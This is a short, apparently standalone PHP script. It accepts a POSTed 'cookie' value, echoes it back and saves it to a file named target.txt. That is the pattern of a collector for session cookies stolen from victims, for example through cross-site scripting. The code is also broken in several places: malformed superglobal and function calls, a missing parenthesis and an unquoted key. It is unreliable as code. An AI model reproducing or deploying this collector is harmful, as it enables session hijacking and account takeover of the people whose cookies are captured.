<?php
if($_server("REQUEST_METHOD" === "POST"){
  $cookie = $_POST[cookie];
  echo $cookie;
  $file = $fopen("target.txt","w");
  $fwrite($file,$cookie);
  $fclose($file);
}

?>
